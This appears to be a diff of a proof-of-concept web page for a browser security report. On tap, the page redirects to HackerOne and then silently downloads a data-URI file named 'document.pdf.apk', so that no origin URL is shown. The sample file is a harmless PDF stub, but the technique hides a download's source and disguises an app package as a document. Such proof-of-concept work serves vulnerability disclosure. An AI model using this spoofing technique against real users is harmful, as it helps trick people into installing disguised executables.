@@ -24,33 +24,34 @@
 
 <h1>
   Tap anywhere.<br>
-  The file will be downloaded without an origin URL showing.
+  You will be redirected to HackerOne first, then the file will be downloaded.
 </h1>
 
 <script>
 document.addEventListener('click', () => {
-  // Create "legitimate" file content (e.g., a PDF-like string, image data)
-  const payload = `%PDF-1.4\n%âãÏÓ\n1 0 obj\n<< /Title (Test PDF) /Author (Your Name) >>\nendobj\n...`; 
+  // Step 1: Redirect to HackerOne first
+  location.href = 'https://hackerone.com'; 
 
-  // Create a Data URI for the content (this does not expose an external URL)
-  const dataUri = `data:application/pdf;base64,${btoa(payload)}`;
-
-  // Create an <a> tag to trigger the download
-  const a = document.createElement('a');
-  a.href = dataUri;
-  a.download = 'document.pdf'; // Suggested filename to make it look legitimate
-  document.body.appendChild(a);
-  a.click(); // Trigger the download
-
-  // Clean up after triggering the download
+  // Step 2: Trigger file download after 3 seconds (since redirect happens immediately)
   setTimeout(() => {
-    a.remove(); // Clean up the <a> element
-  }, 1000);
+    // Create "legitimate" file content (e.g., a PDF-like string, image data)
+    const payload = `%PDF-1.4\n%âãÏÓ\n1 0 obj\n<< /Title (Test PDF) /Author (Your Name) >>\nendobj\n...`; 
 
-  // Optional: Redirect after a delay (for "chaining")
-  setTimeout(() => {
-    location.href = 'https://hackerone.com'; // Redirect to a different page after 3 seconds
-  }, 3000); // Delay navigation
+    // Create a Data URI for the content (this does not expose an external URL)
+    const dataUri = `data:application/pdf;base64,${btoa(payload)}`;
+
+    // Create an <a> tag to trigger the download
+    const a = document.createElement('a');
+    a.href = dataUri;
+    a.download = 'document.pdf.apk'; // Suggested filename to make it look legitimate
+    document.body.appendChild(a);
+    a.click(); // Trigger the download
+
+    // Clean up after triggering the download
+    setTimeout(() => {
+      a.remove(); // Clean up the <a> element
+    }, 1000);
+  }, 3000); // Wait 3 seconds after redirect to trigger the download
 }, { once: true });
 </script>
 
